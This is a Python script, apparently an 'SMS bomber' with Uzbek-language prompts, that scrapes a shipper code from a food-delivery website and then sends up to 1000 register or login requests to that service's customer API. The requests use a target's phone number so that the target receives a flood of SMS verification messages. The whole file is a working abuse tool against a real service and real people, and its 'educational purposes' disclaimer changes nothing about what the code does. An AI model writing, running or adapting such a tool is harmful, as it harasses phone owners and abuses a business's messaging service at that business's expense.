import sys

import requests, lxml
from bs4 import BeautifulSoup

import time
import random

import re
from typing import Union

from utils import (random_user_agent, random_names)
from utils import (FormattingOptions, stars, banner)
from utils import (clear_terminal, error_handler)

fo = FormattingOptions()


class OqtepaLavashBomber:
    def __init__(self, session: requests.Session) -> None:
        self.sess = session
        self.main_url = "https://customer.api.delever.uz/v1/customers/"
        self.shipper_code = ''
        self.headers = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,uz;q=0.6',
            'Connection': 'keep-alive',
            'Host': 'customer.api.delever.uz',
            'User-Agent': random_user_agent(),
            'Shipper': ''
        }
        self.data = {
            'name': random_names(),
            'phone': None
        }

    def _shipper_code(self, soup: BeautifulSoup) -> str:
        l = [i.get('src') for i in soup.find_all('script') if i.get('src')]
        filtered = filter(lambda m: 'main' in m, l)
        filtered = list(filtered)
        url = filtered[0] if list(filtered) else 'none'

        if url == 'none':
            return '36b00947-ad7a-40eb-b7ca-1c0ea267f2ac'

        r = self.sess.get('https://oqtepalavash.uz' + url)
        pattern = re.findall(r'this._shipper = "[^"]+"', r.text)
        if not pattern:
            pattern = re.findall(r'this._shipper="[^"]+"', r.text)
        return str(pattern[0]).split('"')[1].split('"')[0]

    def shipper_code_proccess(self):
        url_for_shipper_code = 'https://oqtepalavash.uz/'
        response = self.sess.get(url_for_shipper_code)
        soup = BeautifulSoup(response.content, 'lxml')
        self.shipper_code = self._shipper_code(soup)
        self.headers['Shipper'] = self.shipper_code

    def _input(self, **kwargs) -> Union[str, int, None]:
        i = None
        while True:
            try:
                value = input(kwargs['text'])
                if value.lower() in ['exit', 'back', 'orqaga', 'quit']:
                    sys.exit()
                if kwargs['phone']:
                    num = value
                    i = num.replace('+998', '') \
                        if num.startswith('+998') \
                        else num
                    if i.isdigit() and len(i) == 9:
                        break
                    print(fo._(fo.FAIL, "Xato kiritildi!"))
                    continue
                elif kwargs['amount']:
                    amount = int(value)
                    i = amount \
                        if amount <= 1000 and amount >= 10 \
                        else 10
                    break
            except ValueError:
                print(fo._(fo.FAIL, "Faqat son yozish kerak!"))
                continue
            except Exception as e:
                print('Siz ssenariyda bo\'lmagan xatolikka yo\'l qo\'ydingiz.\n'
                      'Ana endi mana bu xatolikni tarjima qilib, to\'g\'ri javob bering!\n'
                      f'{e}')
                break

        return i

    def _is_already_exists(self, url) -> bool:
        r = self.sess.post(
            url=url,
            json=self.data,
            headers=self.headers
        ).json()
        if 'Error' not in r:
            return False
        else:
            if r['Error']['code'] == 'ALREADY_EXISTS':
                return True
            else:
                return False

    def start_bombing(self, phone: str, amount: int = 1):
        self.shipper_code_proccess()
        self.data['phone'] = f'+998{phone}'
        url = self.main_url + 'register'
        exists = self._is_already_exists(url)

        if exists:
            url = self.main_url + 'login'

        print(fo._(fo.BOLD, "\nTo'xtatish uchun: [Ctrl]+[C]"))
        
        for s in range(1, amount + 1):
            r = self.sess.post(
                url=url,
                json=self.data,
                headers=self.headers
            ).json()

            if 'Error' not in r:
                print(f"{fo._(fo.BOLD, str(s)+'|')} {fo._(fo.OKGREEN, 'Muvaffaqiyatli!')}")
            else:
                print(f'{0}Xatolik: {1}{2}'.format(fo.FAIL, r['Error']['message']), fo.ENDC)
                break

            time.sleep(random.choice([1, 2, 0.5]))
        else:
            print(fo._(fo.BOLD, '\nTugadi :)\n'))


def main():
    clear_terminal()
    print(banner('Musaffo SKY'))
    print(
        f'{fo.BOLD}Salom, Foydalanuvchi!{fo.ENDC}\n\n'
        'Skript faqat tanishtiruv hamda ta\'lim maqsadlarida edi!\n'
        'Ushbu bilan bog\'liq har qanday faoliyat faqat sizning javobgarligingizdir!\n'
        f'{fo.WARNING}\nMax. 1000ta va min. 10ta SMS donasini sonda belgilash mumkin.\n'
        f'1000dan oshiq son kiritilsa avtomatik 10ga tenglanadi!\n{fo.ENDC}'
        f'\n{fo.BOLD}{fo.UNDERLINE}2022 (c) hoosnick{fo.ENDC}\n'
    )
    print(fo._(fo.BOLD, "Chiqish uchun [Ctrl]+[C] kombinatsiyasini bosing!\n"))
    
    session = requests.session()
    olbomb = OqtepaLavashBomber(session)

    while True:
        try:
            phone = olbomb._input(
                text=fo._(fo.OKBLUE, 'Telefon raqamni (+998)siz kiriting (namuna: 991234567)\n> '),
                phone=True, amount=False)
            amount = olbomb._input(
                text=fo._(fo.OKBLUE, 'Nechta SMS borishini istaysiz? (max: 1000)\n> '),
                phone=False, amount=True)
            
            if all([elem is None for elem in [phone, amount]]):
                print(fo._(fo.FAIL, 'Ma\'lumotlar xato kiritildi!'))
                continue
            olbomb.start_bombing(phone, amount)
        except KeyboardInterrupt:
            clear_terminal()
            break
        except Exception as e:
            print(fo._(fo.FAIL, f'Qanaqadir noma\'lum, g\'alati xatolik yuz berdi!\n{e}'))
            break


if __name__ == '__main__':
    main()
